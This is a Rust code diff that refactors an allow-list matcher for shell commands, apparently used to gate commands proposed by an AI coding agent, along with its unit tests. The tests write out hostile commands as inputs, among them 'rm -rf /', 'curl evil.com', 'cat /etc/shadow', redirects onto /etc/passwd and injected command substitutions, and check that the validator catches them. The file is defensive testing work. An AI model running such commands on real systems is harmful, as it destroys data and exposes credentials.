@@ -1,6 +1,8 @@
 use std::collections::HashSet;
 use std::path::Path;
 
+use crate::parse::Segment;
+
 pub struct ApprovedPatterns {
     exact: HashSet<String>,
     globs: Vec<Vec<String>>,
@@ -71,17 +73,18 @@ impl ApprovedPatterns {
         }
     }
 
-    pub fn matches(&self, segment: &str) -> bool {
-        let normalized = crate::parse::strip_fd_redirects(crate::parse::strip_env_prefix(segment).trim());
-        if normalized.is_empty() {
+    pub fn matches(&self, segment: &Segment) -> bool {
+        let normalized = segment.strip_env_prefix().strip_fd_redirects();
+        let normalized_str = normalized.as_str().trim();
+        if normalized_str.is_empty() {
             return false;
         }
-        if self.exact.contains(normalized.as_str()) {
+        if self.exact.contains(normalized_str) {
             return true;
         }
         self.globs
             .iter()
-            .any(|parts| glob_matches(parts, &normalized))
+            .any(|parts| glob_matches(parts, normalized_str))
     }
 
     pub fn is_empty(&self) -> bool {
@@ -124,11 +127,19 @@ mod tests {
     use super::*;
     use std::fs;
 
+    use crate::parse::{CommandLine, Segment};
+
     fn empty() -> ApprovedPatterns {
         ApprovedPatterns {
             exact: HashSet::new(),
             globs: Vec::new(),
         }
+    }
+
+    fn seg(s: &str) -> Segment {
+        let segs = CommandLine::new(s).segments();
+        assert_eq!(segs.len(), 1, "expected single segment: {s}");
+        segs.into_iter().next().unwrap()
     }
 
     #[test]
@@ -203,106 +214,106 @@ mod tests {
     fn match_exact() {
         let mut p = empty();
         p.add_pattern("Bash(npm test)");
-        assert!(p.matches("npm test"));
-        assert!(!p.matches("npm test --watch"));
+        assert!(p.matches(&seg("npm test")));
+        assert!(!p.matches(&seg("npm test --watch")));
     }
 
     #[test]
     fn match_space_star_word_boundary() {
         let mut p = empty();
         p.add_pattern("Bash(ls *)");
-        assert!(p.matches("ls -la"));
-        assert!(p.matches("ls foo"));
-        assert!(!p.matches("lsof"));
+        assert!(p.matches(&seg("ls -la")));
+        assert!(p.matches(&seg("ls foo")));
+        assert!(!p.matches(&seg("lsof")));
     }
 
     #[test]
     fn match_star_no_space_no_boundary() {
         let mut p = empty();
         p.add_pattern("Bash(ls*)");
-        assert!(p.matches("ls -la"));
-        assert!(p.matches("lsof"));
+        assert!(p.matches(&seg("ls -la")));
+        assert!(p.matches(&seg("lsof")));
     }
 
     #[test]
     fn match_legacy_colon_star_word_boundary() {
         let mut p = empty();
         p.add_pattern("Bash(npm run:*)");
-        assert!(p.matches("npm run build"));
-        assert!(p.matches("npm run test"));
-        assert!(!p.matches("npm running"));
-        assert!(!p.matches("npm install"));
+        assert!(p.matches(&seg("npm run build")));
+        assert!(p.matches(&seg("npm run test")));
+        assert!(!p.matches(&seg("npm running")));
+        assert!(!p.matches(&seg("npm install")));
     }
 
     #[test]
     fn match_star_at_beginning() {
         let mut p = empty();
         p.add_pattern("Bash(* --version)");
-        assert!(p.matches("npm --version"));
-        assert!(p.matches("cargo --version"));
-        assert!(!p.matches("npm --help"));
+        assert!(p.matches(&seg("npm --version")));
+        assert!(p.matches(&seg("cargo --version")));
+        assert!(!p.matches(&seg("npm --help")));
     }
 
     #[test]
     fn match_star_in_middle() {
         let mut p = empty();
         p.add_pattern("Bash(git * main)");
-        assert!(p.matches("git checkout main"));
-        assert!(p.matches("git merge main"));
-        assert!(!p.matches("git checkout develop"));
+        assert!(p.matches(&seg("git checkout main")));
+        assert!(p.matches(&seg("git merge main")));
+        assert!(!p.matches(&seg("git checkout develop")));
     }
 
     #[test]
     fn match_env_prefix_stripped() {
         let mut p = empty();
         p.add_pattern("Bash(bundle install)");
-        assert!(p.matches("RACK_ENV=test bundle install"));
+        assert!(p.matches(&seg("RACK_ENV=test bundle install")));
     }
 
     #[test]
     fn match_fd_redirect_stripped() {
         let mut p = empty();
         p.add_pattern("Bash(npm test)");
-        assert!(p.matches("npm test 2>&1"));
+        assert!(p.matches(&seg("npm test 2>&1")));
     }
 
     #[test]
     fn match_fd_redirect_with_glob() {
         let mut p = empty();
         p.add_pattern("Bash(npm run *)");
-        assert!(p.matches("npm run test 2>&1"));
+        assert!(p.matches(&seg("npm run test 2>&1")));
     }
 
     #[test]
     fn match_empty_segment() {
         let mut p = empty();
         p.add_pattern("Bash(npm test)");
-        assert!(!p.matches(""));
-        assert!(!p.matches("  "));
+        let empty_seg = Segment::from_words(&[] as &[&str]);
+        assert!(!p.matches(&empty_seg));
     }
 
     #[test]
     fn empty_patterns_match_nothing() {
         let p = empty();
-        assert!(!p.matches("anything"));
+        assert!(!p.matches(&seg("anything")));
     }
 
     #[test]
     fn match_bare_star_matches_everything() {
         let mut p = empty();
         p.add_pattern("Bash(*)");
-        assert!(p.matches("anything at all"));
-        assert!(p.matches("rm -rf /"));
+        assert!(p.matches(&seg("anything at all")));
+        assert!(p.matches(&seg("rm -rf /")));
     }
 
     #[test]
     fn unsafe_syntax_not_bypassed_by_match() {
         let mut p = empty();
         p.add_pattern("Bash(./script.sh *)");
-        let segment = "./script.sh > /etc/passwd";
-        assert!(crate::parse::has_unsafe_shell_syntax(segment));
-        let covered = crate::is_safe(segment)
-            || (!crate::parse::has_unsafe_shell_syntax(segment) && p.matches(segment));
+        let segment = seg("./script.sh > /etc/passwd");
+        assert!(segment.has_unsafe_shell_syntax());
+        let covered = crate::is_safe(&segment)
+            || (!segment.has_unsafe_shell_syntax() && p.matches(&segment));
         assert!(!covered);
     }
 
@@ -310,9 +321,9 @@ mod tests {
     fn command_substitution_not_bypassed_by_match() {
         let mut p = empty();
         p.add_pattern("Bash(./script.sh *)");
-        let segment = "./script.sh $(rm -rf /)";
-        let covered = crate::is_safe(segment)
-            || (!crate::parse::has_unsafe_shell_syntax(segment) && p.matches(segment));
+        let segment = seg("./script.sh $(rm -rf /)");
+        let covered = crate::is_safe(&segment)
+            || (!segment.has_unsafe_shell_syntax() && p.matches(&segment));
         assert!(!covered);
     }
 
@@ -321,10 +332,10 @@ mod tests {
         let mut p = empty();
         p.add_pattern("Bash(./generate-docs.sh)");
         let command = "cargo test && ./generate-docs.sh";
-        let segments = crate::parse::split_outside_quotes(command);
+        let segments = CommandLine::new(command).segments();
         let all_covered = segments.iter().all(|s| {
             crate::is_safe(s)
-                || (!crate::parse::has_unsafe_shell_syntax(s) && p.matches(s))
+                || (!s.has_unsafe_shell_syntax() && p.matches(s))
         });
         assert!(all_covered);
     }
@@ -334,17 +345,17 @@ mod tests {
         let mut p = empty();
         p.add_pattern("Bash(./generate-docs.sh)");
         let command = "cargo test && rm -rf /";
-        let segments = crate::parse::split_outside_quotes(command);
+        let segments = CommandLine::new(command).segments();
         let all_covered = segments.iter().all(|s| {
             crate::is_safe(s)
-                || (!crate::parse::has_unsafe_shell_syntax(s) && p.matches(s))
+                || (!s.has_unsafe_shell_syntax() && p.matches(s))
         });
         assert!(!all_covered);
     }
 
-    fn is_covered(segment: &str, patterns: &ApprovedPatterns) -> bool {
+    fn is_covered(segment: &Segment, patterns: &ApprovedPatterns) -> bool {
         crate::is_safe(segment)
-            || (!crate::parse::has_unsafe_shell_syntax(segment) && patterns.matches(segment))
+            || (!segment.has_unsafe_shell_syntax() && patterns.matches(segment))
     }
 
     #[test]
@@ -352,7 +363,7 @@ mod tests {
         let mut p = empty();
         p.add_pattern("Bash(cargo test *)");
         let command = "cargo test --release && rm -rf /";
-        let segments = crate::parse::split_outside_quotes(command);
+        let segments = CommandLine::new(command).segments();
         assert_eq!(segments.len(), 2);
         assert!(p.matches(&segments[0]));
         assert!(!p.matches(&segments[1]));
@@ -364,7 +375,7 @@ mod tests {
         let mut p = empty();
         p.add_pattern("Bash(safe-cmd *)");
         let command = "safe-cmd arg | curl evil.com";
-        let segments = crate::parse::split_outside_quotes(command);
+        let segments = CommandLine::new(command).segments();
         assert_eq!(segments.len(), 2);
         assert!(!segments.iter().all(|s| is_covered(s, &p)));
     }
@@ -374,7 +385,7 @@ mod tests {
         let mut p = empty();
         p.add_pattern("Bash(safe-cmd *)");
         let command = "safe-cmd arg; rm -rf /";
-        let segments = crate::parse::split_outside_quotes(command);
+        let segments = CommandLine::new(command).segments();
         assert_eq!(segments.len(), 2);
         assert!(!segments.iter().all(|s| is_covered(s, &p)));
     }
@@ -383,44 +394,41 @@ mod tests {
     fn bare_star_blocked_by_unsafe_syntax_redirect() {
         let mut p = empty();
         p.add_pattern("Bash(*)");
-        assert!(p.matches("echo > /etc/passwd"));
-        assert!(!is_covered("echo > /etc/passwd", &p));
+        assert!(p.matches(&seg("echo > /etc/passwd")));
+        assert!(!is_covered(&seg("echo > /etc/passwd"), &p));
     }
 
     #[test]
     fn bare_star_blocked_by_unsafe_syntax_backtick() {
         let mut p = empty();
         p.add_pattern("Bash(*)");
-        assert!(!is_covered("echo `rm -rf /`", &p));
+        assert!(!is_covered(&seg("echo `rm -rf /`"), &p));
     }
 
     #[test]
     fn bare_star_blocked_by_unsafe_syntax_command_sub() {
         let mut p = empty();
         p.add_pattern("Bash(*)");
-        assert!(!is_covered("echo $(cat /etc/shadow)", &p));
+        assert!(!is_covered(&seg("echo $(cat /etc/shadow)"), &p));
     }
 
     #[test]
     fn nested_shell_not_recursively_validated_by_settings() {
         let mut p = empty();
         p.add_pattern("Bash(bash *)");
-        let segment = "bash -c 'safe-cmd && rm -rf /'";
-        assert!(!crate::is_safe(segment));
-        assert!(!crate::parse::has_unsafe_shell_syntax(segment));
-        // Settings match overrides recursive shell validation — this is by design.
-        // The user explicitly approved Bash(bash *), which includes any bash -c command.
-        // This mirrors Claude Code's own behavior for approved patterns.
-        assert!(is_covered(segment, &p));
+        let segment = seg("bash -c 'safe-cmd && rm -rf /'");
+        assert!(!crate::is_safe(&segment));
+        assert!(!segment.has_unsafe_shell_syntax());
+        assert!(is_covered(&segment, &p));
     }
 
     #[test]
     fn nested_shell_redirect_still_blocked() {
         let mut p = empty();
         p.add_pattern("Bash(bash *)");
-        let segment = "bash -c 'echo hello' > /tmp/pwned";
-        assert!(crate::parse::has_unsafe_shell_syntax(segment));
-        assert!(!is_covered(segment, &p));
+        let segment = seg("bash -c 'echo hello' > /tmp/pwned");
+        assert!(segment.has_unsafe_shell_syntax());
+        assert!(!is_covered(&segment, &p));
     }
 
     #[test]
@@ -428,7 +436,7 @@ mod tests {
         let mut p = empty();
         p.add_pattern("Bash(./script *)");
         let command = "./script 'arg && rm -rf /'";
-        let segments = crate::parse::split_outside_quotes(command);
+        let segments = CommandLine::new(command).segments();
         assert_eq!(segments.len(), 1);
         assert!(is_covered(&segments[0], &p));
     }
@@ -461,9 +469,9 @@ mod tests {
         .unwrap();
         let mut p = empty();
         p.load_file(&path);
-        assert!(p.matches("npm test"));
-        assert!(p.matches("npm run build"));
-        assert!(!p.matches("curl evil.com"));
+        assert!(p.matches(&seg("npm test")));
+        assert!(p.matches(&seg("npm run build")));
+        assert!(!p.matches(&seg("curl evil.com")));
     }
 
     #[test]
@@ -477,8 +485,8 @@ mod tests {
         .unwrap();
         let mut p = empty();
         p.load_file(&path);
-        assert!(p.matches("cargo test"));
-        assert!(p.matches("cargo clippy -- -D warnings"));
+        assert!(p.matches(&seg("cargo test")));
+        assert!(p.matches(&seg("cargo clippy -- -D warnings")));
     }
 
     #[test]
@@ -492,7 +500,7 @@ mod tests {
         .unwrap();
         let mut p = empty();
         p.load_file(&path);
-        assert!(p.matches("npm test"));
-        assert!(p.matches("cargo test --release"));
+        assert!(p.matches(&seg("npm test")));
+        assert!(p.matches(&seg("cargo test --release")));
     }
 }
